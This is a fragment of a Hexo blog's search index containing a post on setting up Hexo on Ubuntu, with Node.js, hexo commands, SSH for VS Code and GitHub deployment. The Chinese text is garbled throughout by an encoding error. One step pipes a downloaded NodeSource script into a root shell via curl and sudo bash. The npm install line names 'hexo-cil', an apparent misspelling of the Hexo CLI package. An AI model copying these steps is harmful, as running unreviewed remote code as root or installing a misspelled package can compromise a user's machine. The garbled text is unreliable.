bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><hr><p>æ›´æ–°äº2023.11.24 <s>ï¼ˆè™½ç„¶ä¸Šé¢æœ‰æ›´æ–°æ—¶é—´ï¼‰</s>(ä¸å‡†ï¼Œè¿˜æ˜¯çœ‹è¿™ä¸ªå§)</p><h2 id="ç¯å¢ƒå®‰è£…">ç¯å¢ƒå®‰è£…</h2><p>æ­£å¥½è£…äº†å°æ–°ç”µè„‘ï¼Œç¯å¢ƒè¿˜æ˜¯è¦é…çš„ã€‚</p><h3 id="Windows">Windows</h3><p>æ‡’äº†ã€‚<br>ç¡®åˆ‡æ¥è¯´å‰å‡ å¤©å¸®äººåšäº†ä¸ªnodejsåšçš„electroné¡¹ç›®ï¼Œç»“æœç¯å¢ƒæ€ä¹ˆéƒ½é…ä¸å¥½ï¼ˆæ‚²ï¼‰ï¼Œé‚æ”¾å¼ƒåœ¨Windowsä¸Šç»§ç»­æŠ˜è…¾nodejsçš„æƒ³æ³•ã€‚</p><h3 id="MacOS">MacOS</h3><p>æ²¡æœ‰ï¼Œå¦‚æœæœ‰å¥½å¿ƒäººvæˆ‘ä¸€ä¸ªå°±è¯•è¯•</p><h3 id="Linuxï¼ˆUbuntuï¼‰">Linuxï¼ˆUbuntuï¼‰</h3><p>å› ä¸ºç°ä»£Linuxå‘è¡Œç‰ˆå¼ºå¤§çš„åŒ…ç®¡ç†å™¨ï¼ˆå¦‚apt,pacmanï¼‰ï¼Œæ‰€ä»¥åœ¨Linuxä¸Šé…ç½®ç¯å¢ƒç›¸å¯¹æ¥è¯´æ˜¯ä¸€ä»¶æ¯”è¾ƒèˆ’æœçš„äº‹æƒ…ã€‚Linuxè™šæ‹ŸæœºæŠ˜è…¾å´©äº†è¿˜å¯ä»¥ç›´æ¥å›æ»šã€‚<br>ä¸»è¦æ˜¯æŠ˜è…¾äº†ä¸€ä¸‹Ubuntuï¼ˆå…¶ä»–å‘è¡Œç‰ˆæ‡’å¾—è¯•äº†ï¼Œé™¤éæˆ‘ä»¥åæœ‰æƒ³æ³•æ¢ä¸»åŠ›æ“ä½œç³»ç»Ÿã€‚btwï¼Œå¦‚æœæˆ‘æƒ³æ¢ä¸»åŠ›æ“ä½œç³»ç»Ÿï¼Œä¸ºä»€ä¹ˆä¸ç”¨Macï¼Ÿï¼‰</p><h3 id="1-å®‰è£…nodejs">1.å®‰è£…nodejs</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install npm</span><br><span class="line">curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - &amp;&amp;\</span><br><span class="line">sudo apt install nodejs</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯æ¯”è¾ƒç®€å•çš„å®‰è£…æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥å‚è€ƒç½‘ä¸Šçš„æ–¹æ³•å®‰è£…è¾ƒæ–°ç‰ˆæœ¬çš„ã€‚ä¸è¿‡æˆ‘ä¸€èˆ¬æ˜¯èƒ½å·æ‡’å°±å·æ‡’ï¼Œæ‰€ä»¥è¿™å„¿ç…§ä¾‹å°±å·ä¸ªå°æ‡’äº†ã€‚</p><h3 id="2-å®‰è£…hexo">2.å®‰è£…hexo</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cil</span><br></pre></td></tr></table></figure><p>è¿™ä¹‹åä½¿ç”¨å®˜æ–¹ç»™å‡ºçš„å‘½ä»¤è¿›è¡Œæµ‹è¯•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™ä¸ªå°±æˆäº†<br><img src="%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-24%20180738.png" alt="æ•ˆæœ"></p><h3 id="3-é…ç½®ä¸»é¢˜">3.é…ç½®ä¸»é¢˜</h3><p>æ‡’äº†ï¼Œæ ¹æ®å®˜æ–¹æ–‡æ¡£å’Œè‡ªå·±å–œå¥½é…ç½®å³å¯ã€‚</p><h3 id="4-ä½¿ç”¨">4.ä½¿ç”¨</h3><p>æ€ä¹ˆç”¨ï¼Ÿ<br>Vscode sshçš„åŠŸèƒ½æ˜¯å¾ˆå®Œå–„çš„ï¼Œä¸‹è½½æ’ä»¶ç›´æ¥ç”¨å°±å¥½äº†ã€‚<br><img src="%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-24%20175122.png" alt="æ’ä»¶å•†åº—"><br>Ubuntuä¸‹ä¸‹è½½å¹¶å¯åŠ¨ssh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openssh-server</span><br><span class="line">service ssh start</span><br></pre></td></tr></table></figure><p>ä¹‹åè¿æ¥è¿‡ç¨‹ä¸sshè¿æ¥ä¸€è‡´ã€‚</p><h3 id="5-éƒ¨ç½²åˆ°github">5.éƒ¨ç½²åˆ°github</h3><p>æ•ˆæœï¼šè¿™ä¸ªé¡µé¢å°±æ˜¯æ•ˆæœ</p>]]></content>
      
      
      <categories>
          
          <category> åšå®¢æ’°å†™ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> åšå®¢æ’°å†™ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
